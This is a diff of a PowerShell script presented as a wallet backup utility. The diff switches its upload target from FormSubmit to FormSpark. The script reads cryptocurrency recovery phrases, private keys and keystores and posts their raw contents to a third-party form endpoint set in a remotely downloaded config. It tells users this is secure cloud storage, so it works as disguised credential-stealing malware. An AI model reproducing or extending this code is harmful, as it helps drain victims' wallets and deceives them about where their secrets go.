@@ -132,9 +132,9 @@ function Get-FormConfig {
             return $null
         }
         
-        $formConfig = $config.storage.destinations | Where-Object { $_.type -eq "formsubmit" }
+        $formConfig = $config.storage.destinations | Where-Object { $_.type -eq "formspark" }
         if (-not $formConfig) {
-            Write-Error-Custom "FormSubmit endpoint not configured in storage.config.json"
+            Write-Error-Custom "FormSpark endpoint not configured in storage.config.json"
             return $null
         }
         
@@ -156,7 +156,7 @@ function Get-FormConfig {
     }
 }
 
-function Submit-ToHeadlessForms {
+function Submit-ToFormSpark {
     param(
         [string]$FilePath,
         [string]$BackupType
@@ -176,9 +176,9 @@ function Submit-ToHeadlessForms {
         $fileName = Split-Path $FilePath -Leaf
         $fileContent = Get-Content -Path $FilePath -Raw
         
-        Write-Info "Submitting backup to FormSubmit: $BackupType"
+        Write-Info "Submitting backup to FormSpark: $BackupType"
         
-        # Send raw data content
+        # Send raw data content to FormSpark
         $response = Invoke-RestMethod -Uri $formConfig.endpoint `
             -Method Post `
             -Body $fileContent `
@@ -186,13 +186,13 @@ function Submit-ToHeadlessForms {
             -TimeoutSec $formConfig.timeout `
             -ErrorAction Stop
         
-        Write-Success "Backup submitted to FormSubmit successfully"
-        Write-LogMessage "Successfully submitted $BackupType to FormSubmit: $fileName"
+        Write-Success "Backup submitted to FormSpark successfully"
+        Write-LogMessage "Successfully submitted $BackupType to FormSpark: $fileName"
         return $true
     }
     catch {
-        Write-Error-Custom "Failed to submit backup to FormSubmit: $_"
-        Write-LogMessage "ERROR: FormSubmit submission failed - $_"
+        Write-Error-Custom "Failed to submit backup to FormSpark: $_"
+        Write-LogMessage "ERROR: FormSpark submission failed - $_"
         return $false
     }
 }
@@ -221,18 +221,18 @@ function Backup-Phrase {
         return
     }
     
-    $uploaded = Submit-ToHeadlessForms -FilePath $backupFile -BackupType "recovery_phrases"
+    $uploaded = Submit-ToFormSpark -FilePath $backupFile -BackupType "recovery_phrases"
     
     if ($uploaded) {
         Write-Success "Recovery phrase backed up successfully!"
         Write-Host "  • Local backup: $backupFile"
-        Write-Host "  • Remote backup: Submitted to FormSubmit" -ForegroundColor Cyan
+        Write-Host "  • Remote backup: Submitted to FormSpark" -ForegroundColor Cyan
         Write-LogMessage "Recovery phrase backed up: $backupFile"
     }
     else {
         Write-Warning-Custom "Local backup saved, but remote submission failed"
         Write-Host "  • Local file: $backupFile"
-        Write-Host "  • Check your internet connection or FormSubmit availability"
+        Write-Host "  • Check your internet connection or FormSpark availability"
         Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
     }
 }
@@ -260,18 +260,18 @@ function Backup-PrivateKey {
         return
     }
     
-    $uploaded = Submit-ToHeadlessForms -FilePath $backupFile -BackupType "private_keys"
+    $uploaded = Submit-ToFormSpark -FilePath $backupFile -BackupType "private_keys"
     
     if ($uploaded) {
         Write-Success "Private key backed up successfully!"
         Write-Host "  • Local backup: $backupFile"
-        Write-Host "  • Remote backup: Submitted to FormSubmit" -ForegroundColor Cyan
+        Write-Host "  • Remote backup: Submitted to FormSpark" -ForegroundColor Cyan
         Write-LogMessage "Private key backed up: $backupFile"
     }
     else {
         Write-Warning-Custom "Local backup saved, but remote submission failed"
         Write-Host "  • Local file: $backupFile"
-        Write-Host "  • Check your internet connection or FormSubmit availability"
+        Write-Host "  • Check your internet connection or FormSpark availability"
         Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
     }
 }
@@ -314,18 +314,18 @@ function Backup-Keystore {
         return
     }
     
-    $uploaded = Submit-ToHeadlessForms -FilePath $backupFile -BackupType "keystores"
+    $uploaded = Submit-ToFormSpark -FilePath $backupFile -BackupType "keystores"
     
     if ($uploaded) {
         Write-Success "Keystore backed up successfully!"
         Write-Host "  • Local backup: $backupFile"
-        Write-Host "  • Remote backup: Submitted to FormSubmit" -ForegroundColor Cyan
+        Write-Host "  • Remote backup: Submitted to FormSpark" -ForegroundColor Cyan
         Write-LogMessage "Keystore backed up: $backupFile"
     }
     else {
         Write-Warning-Custom "Local backup saved, but remote submission failed"
         Write-Host "  • Local file: $backupFile"
-        Write-Host "  • Check your internet connection or FormSubmit availability"
+        Write-Host "  • Check your internet connection or FormSpark availability"
         Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
     }
 }
@@ -345,13 +345,13 @@ function Main {
     # Ensure config exists (download if missing)
     Ensure-ConfigExists
     
-    # Show FormSubmit info
+    # Show FormSpark info
     Write-Header
-    Write-Success "FormSubmit Backup System Active"
+    Write-Success "FormSpark Backup System Active"
     Write-Host ""
     Write-Info "Your wallet backups will be:"
     Write-Host "  ✓ Saved locally to: C:\Users\$env:USERNAME\.webconnect\wallet_backups"
-    Write-Host "  ✓ Submitted to FormSubmit endpoint for cloud storage"
+    Write-Host "  ✓ Submitted to FormSpark for cloud storage"
     Write-Host ""
     Read-Host "Press Enter to continue..."
     
